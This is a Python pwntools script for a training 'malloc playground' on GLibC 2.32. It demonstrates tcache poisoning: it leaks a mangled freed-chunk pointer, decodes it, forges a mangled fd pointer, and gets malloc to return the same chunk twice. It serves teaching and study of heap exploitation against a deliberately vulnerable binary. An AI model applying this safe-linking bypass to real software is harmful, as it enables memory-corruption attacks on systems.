'''
GLibC 2.32 Memory Protections Playground
For using malloc playground, this has 5 intergrated functions: 
- malloc n
	- Malloc n bytes
- free p 
	- Free ptr p
- write p index
	- write to pointer + index
- show p index 
	- print content at pointer + index
- libc
	- Leak the address of system
'''

from pwn import * 
import os

# Package added for mangling and demangling pointers
from mangle import * 


mode = '' # Turn on gdb when set to debug
libc_name = './libc.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'playground2'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = process(elf.path,env=env)


'''
Functions for interacting with malloc_playground
'''

# Takes in a size to allocate
def malloc(size):
	p.sendlineafter(">","malloc " + str(size))
	p.recvuntil("==>")	
	return int(p.recvline(),16)

# Takes in the pointer to free
def free(location):
	p.sendlineafter(">","free " + str(hex(location)))

# Prints the location at a ptr, and an offset from that location
def show(ptr, index):
	p.sendlineafter(">","show " + str(hex(ptr)) + " " + str(index))
	p.recvuntil(":") 
	return int(p.recvline(),16)

# Leaks the address of 'system'
def get_libc():
	p.sendlineafter(">", "libc")
	p.recvuntil(":")
	return int(p.recvline(),16)

# Allows the writing of 8 bytes at any index
# Ptr is the malloc'ed ptr, index is the offset and content is the data to write
def write(ptr, index, content):
	p.sendlineafter(">", "write " + str(hex(ptr)) + " " + str(index))
	p.sendlineafter(":",str(content))
	return 

# This demo is for faking a chunk at an arbitrary location
def demo():
	# Starting allocations
	lst = []
	lst.append(malloc(0x18)) # Chunk1
	lst.append(malloc(0x20)) # Chunk2
	lst.append(malloc(0x28)) # Chunk3
	lst.append(malloc(30))   # Chunk4
	free(lst[1])
	free(lst[2])
	free(lst[3])

	print "Allocated chunks"
	print "=================="
	index = 1
	for elt in lst: 
		print "Chunk" + str(index) + " " + hex(elt) 
		index += 1

	print "\n"

	print "Leak Fd Ptr and Convert"
	print "========================"

	leaked_ptr = show(lst[3],2)
	print "Leaked Fd Ptr: ", hex(leaked_ptr)

	print "Converting leaked Fd ptr..."
	ptr, loc = recover_ptrs(leaked_ptr,offset=0x0,loc_final_bits=0x300)
	print "Recovered Fd Ptr: ", hex(ptr)
	print "Location:", hex(loc)
	print "\n"

	print "Point fd to point to original chunk1"
	print "======================================"

	# Rewriting the fd of chunk4 with the location of chunk1.
	new_ptr = encode_ptr(ptr - 0x50, loc)
	print "Fake fd ptr to chunk1 (mangled): ", hex(new_ptr)

	print "Overwrite chunk4 Fd Ptr with location of chunk1"
	write(lst[3],0x0,p64(new_ptr))

	print "Get the chunk that points to chunk1 via two calls to malloc"

	# Filler chunk...
	lst.append(malloc(0x20))

	# Chunk1, again!
	lst.append(malloc(0x20))
	print "Chunk1 is now allocated twice!" 
	print "Index 0 of Ptr List: ", hex(lst[0])
	print "Index 5 of Ptr List: ", hex(lst[5])
	print "\n"

	print "Sucessfully created fake chunk with mangled pointers"
	p.interactive()

# Remove if you want to write your own code. This is just a demo
demo()
